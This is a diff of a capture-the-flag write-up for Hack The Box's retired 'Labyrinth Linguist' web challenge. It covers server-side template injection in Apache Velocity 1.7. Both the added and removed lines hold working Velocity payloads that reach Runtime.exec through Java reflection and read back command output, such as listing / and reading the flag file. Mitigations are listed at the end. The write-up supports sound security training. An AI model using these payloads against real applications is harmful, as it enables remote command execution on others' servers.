@@ -4,7 +4,7 @@ type: Web
 difficulty: Easy
 platform: Hack The Box
 state: Retired
-tags: [web, java, velocity, ssti, rce, cve-2020-13936]
+tags: [web, java, velocity, ssti, rce]
 ---
 
 # Labyrinth Linguist — Hack The Box
@@ -15,51 +15,57 @@ tags: [web, java, velocity, ssti, rce, cve-2020-13936]
 
 ## TL;DR
 
-A Java (Spring) app that "translates" text with **Apache Velocity**. The template is built from user input, so `#set` can create objects and reach `Runtime.exec`: **SSTI** with command execution.
+A **Java 11** app that "translates" user text by building an **Apache Velocity 1.7** template from it. `#set` creates objects and, through reflection, reaches `Runtime.exec`: **SSTI** with command execution.
 
 ## Brief
 
-A form returning the text in another language. No Flask, no Jinja: the engine is **Velocity 1.7**, affected by **CVE-2020-13936** (the default `Uberspector` does not block reflection), and its syntax is `#set($var = ...)`.
+A form with a text field returning the "translation". The source (Maven, `Main.java`) ships in the challenge ZIP; the flag is copied to `/flag.txt` and the `Dockerfile` **renames** it to `/flag<random>.txt`, so the directory must be listed.
 
-## Analysis
+## Recon
 
-Test the engine syntax:
-
-```text
-#set($x = 7 * 7) $x
+```bash
+curl -s http://<IP>:<PORT>/ | head -40
+# POST with text=<...>
+curl -s -X POST http://<IP>:<PORT>/ -d 'text=$name'
 ```
 
-If it returns `49`, the input is evaluated as a Velocity template. Velocity reaches Java classes through reflection:
+If `$name` returns `World`, the input is evaluated as a Velocity template: the challenge context defines that variable.
+
+## The flaw
+
+Velocity is not Jinja or Twig: syntax is `#set($var = ...)` and it can reach Java classes. The classic vector is `$class.inspect(...)`, but `$class` is not exposed in this build. The working route gets `Class` from a **string** and calls `forName`:
 
 ```text
-#set($str = $class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
+#set($x = '')
+#set($rt = $x.class.forName('java.lang.Runtime'))
 ```
 
 ## Exploitation
 
 ```text
-#set($s = $class.inspect("java.lang.Runtime").type.getRuntime().exec("cat /flag*"))
-#set($in = $s.getInputStream())
-#set($br = $class.inspect("java.io.BufferedReader").type.getConstructor($class.inspect("java.io.Reader").type).newInstance($class.inspect("java.io.InputStreamReader").type.getConstructor($class.inspect("java.io.InputStream").type).newInstance($in)))
-$br.readLine()
+#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ch=$x.class.forName('java.lang.Character'))#set($p=$rt.getRuntime().exec('ls /'))#set($br=$x.class.forName('java.io.BufferedReader'))#set($isr=$x.class.forName('java.io.InputStreamReader'))#set($r=$br.getConstructor($isr).newInstance($p.getInputStream()))$r.readLine()
 ```
 
-Shorter with `ProcessBuilder`:
+The response carries the command's first line. `ls /` reveals `flagXXXXXXXXXX.txt`; repeat with:
 
 ```text
-#set($p = $class.inspect("java.lang.ProcessBuilder").type.getConstructor($class.inspect("java.util.List").type))
+... .exec('cat /flagXXXXXXXXXX.txt') ...
 ```
 
-Command output lands in the response; `cat /flag*` prints the flag.
+URL-encode the payload (`#` → `%23`) when sent by `GET`; over `POST` it goes in the body.
 
-## Pitfalls
+## Evidence
 
-- **Quotes and `$`**: encode `#` as `%23` when sending over GET.
-- **One `readLine()`**: for multiple lines, repeat or use `System.out`.
-- **Sandbox**: if `$class` is blocked, try `$context`/`$request` and framework-exposed objects.
+- Trimmed command output; no flags.
+- Real values live in `private/`.
 
 ## Lessons
 
+- **`$class` is not always there**: when the sandbox blocks it, `''.class.forName(...)` still yields `Class`.
+- **`readLine()` reads one line**: for more output, repeat or `cat` a single file.
+- **The flag is not where it looks**: the `Dockerfile` renames it; list `/`.
+- **`#` in the URL**: unencoded, the fragment is dropped and the payload never arrives.
+
 - Velocity is SSTI too: the engine need not be Jinja or Twig.
-- `$class.inspect` is the bridge to Java reflection and from there to `Runtime`.
-- Mitigation: `VelocityEngine` with a data context, templates fixed on disk, and `SecureUberspector`.
+- Java reflection is execution: any reachable `Class.forName` is RCE.
+- Mitigation: templates fixed on disk, a data context and `SecureUberspector`.
